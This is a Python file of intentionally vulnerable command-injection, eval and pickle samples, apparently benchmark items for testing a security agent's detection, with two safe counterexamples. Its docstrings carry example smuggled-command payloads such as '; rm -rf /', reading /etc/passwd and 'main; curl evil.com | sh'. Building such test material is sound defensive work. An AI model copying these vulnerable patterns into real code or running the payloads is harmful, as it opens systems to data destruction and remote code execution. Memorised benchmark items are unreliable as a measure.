"""
CWE-77 Command Injection Vulnerable Samples

Purpose: Security agent benchmark testing
Source: Issue #756 Security Agent Detection Gaps Remediation

DO NOT USE IN PRODUCTION - These are intentionally vulnerable examples
"""

from __future__ import annotations

import os
import subprocess


# =============================================================================
# CI-001: Unquoted variables in shell command
# =============================================================================
# VULNERABLE: CWE-77 shell=True with user input
# EXPECTED: CRITICAL - Shell metacharacters can inject commands
# SOURCE: PR #752 Export-ClaudeMemMemories.ps1:42 (Python equivalent)


def invoke_plugin_insecure(query: str, output_file: str, plugin_script: str = "plugin.js") -> None:
    """
    VULNERABLE: shell=True with string concatenation allows shell metacharacters.

    Attack: query = "; rm -rf /"
    Result: Executes TWO commands: npx tsx ... AND rm -rf /
    """
    # VULNERABLE: shell=True with user input allows injection
    cmd = f"npx tsx {plugin_script} {query} {output_file}"
    subprocess.run(cmd, shell=True)  # noqa: S602

    # Also vulnerable patterns:
    os.system(f"node {plugin_script} {query}")  # noqa: S605
    subprocess.Popen(f"python script.py {query}", shell=True)  # noqa: S602


# =============================================================================
# CI-002: eval with user input
# =============================================================================
# VULNERABLE: CWE-77/CWE-94 eval with user input
# EXPECTED: CRITICAL - Arbitrary code execution
# SOURCE: Synthetic


def execute_user_command_insecure(user_command: str) -> None:
    """
    VULNERABLE: eval executes arbitrary Python code.

    Attack: user_command = "__import__('os').system('rm -rf /')"
    Result: Executes arbitrary system commands
    """
    # VULNERABLE: eval executes arbitrary Python code
    eval(user_command)  # noqa: S307

    # Also vulnerable: exec
    exec(user_command)  # noqa: S102


# =============================================================================
# CI-003: Format string with external input
# =============================================================================
# VULNERABLE: CWE-94 Format string with external input in command
# EXPECTED: HIGH - Code injection via configuration
# SOURCE: Synthetic


def process_template_insecure(config_path: str) -> str | None:
    """
    VULNERABLE: f-string with external input can inject commands.

    Attack: Config contains { "template": "__import__('os').system('cat /etc/passwd')" }
    Result: Executes arbitrary code during string evaluation
    """
    import json

    # VULNERABLE: External input used in eval context
    with open(config_path) as f:
        config = json.load(f)
    template = config.get("template", "")

    # VULNERABLE: f-string evaluation with external input
    # (in practice, this would be eval of the template)
    result = eval(f"f'{template}'")  # noqa: S307
    return result


# =============================================================================
# CI-004: Shell metacharacters in git command
# =============================================================================
# VULNERABLE: CWE-77 Shell metacharacters in external command
# EXPECTED: CRITICAL - Command chaining via environment variable
# SOURCE: Synthetic


def checkout_branch_insecure() -> None:
    """
    VULNERABLE: Environment variable in shell command.

    Attack: BRANCH_NAME = "main; curl evil.com | sh"
    Result: Checks out main, then downloads and executes malicious script
    """
    # VULNERABLE: Environment variable in shell command
    branch_name = os.environ.get("BRANCH_NAME", "main")
    subprocess.run(f"git checkout {branch_name}", shell=True)  # noqa: S602

    # Also vulnerable with other commands
    pr_number = os.environ.get("PR_NUMBER", "1")
    os.system(f"gh pr checkout {pr_number}")  # noqa: S605


# =============================================================================
# CI-005: SAFE PATTERN - Properly parameterized subprocess
# =============================================================================
# SAFE: List arguments prevent injection
# EXPECTED: PASS - This should NOT be flagged
# SOURCE: Safe pattern


def invoke_plugin_secure(query: str, output_file: str, plugin_script: str = "plugin.js") -> None:
    """
    SAFE: List arguments treat metacharacters as literals.

    Each argument is passed separately, preventing shell interpretation.
    """
    # SAFE: List arguments prevent injection
    subprocess.run(["npx", "tsx", plugin_script, query, output_file], check=True)  # noqa: S603, S607

    # SAFE: Using shlex.split for existing command strings
    import shlex

    cmd = f"node {shlex.quote(plugin_script)} {shlex.quote(query)}"
    args = shlex.split(cmd)
    subprocess.run(args, check=True)  # noqa: S603


# =============================================================================
# CI-006: SAFE PATTERN - Predefined commands
# =============================================================================
# SAFE: Whitelist approach prevents injection
# EXPECTED: PASS - This should NOT be flagged
# SOURCE: Safe pattern


def invoke_predefined_command(command_name: str) -> None:
    """
    SAFE: User selects KEY not command syntax.

    Only predefined commands can be executed, preventing injection.
    """
    # SAFE: User selects key, not command syntax
    allowed_commands = {
        "status": ["git", "status"],
        "log": ["git", "log", "-n", "10"],
        "diff": ["git", "diff"],
    }

    if command_name in allowed_commands:
        subprocess.run(allowed_commands[command_name], check=True)  # noqa: S603, S607
    else:
        raise ValueError(f"Unknown command: {command_name}")


# =============================================================================
# CI-007: pickle deserialization
# =============================================================================
# VULNERABLE: CWE-502 Unsafe deserialization
# EXPECTED: CRITICAL - Arbitrary code execution via pickle
# SOURCE: Synthetic


def load_data_insecure(data_path: str) -> object:
    """
    VULNERABLE: pickle.load runs arbitrary code during deserialization.

    Attack: Malicious pickle file contains __reduce__ that runs code
    Result: Arbitrary code execution when file is loaded
    """
    import pickle

    # VULNERABLE: pickle.load can run arbitrary code
    with open(data_path, "rb") as f:
        return pickle.load(f)  # noqa: S301
